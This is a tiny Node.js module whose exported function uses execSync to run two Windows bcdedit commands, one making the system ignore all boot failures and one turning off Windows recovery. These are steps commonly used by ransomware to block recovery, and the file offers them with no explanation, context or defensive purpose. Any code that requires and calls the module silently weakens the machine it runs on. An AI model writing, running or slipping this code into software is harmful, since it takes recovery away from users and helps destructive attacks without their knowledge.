const {execSync}=require('child_process');
module.exports=()=>{execSync('bcdedit /set {current} bootstatuspolicy ignoreallfailures');execSync('bcdedit /set {current} recoveryenabled no');};
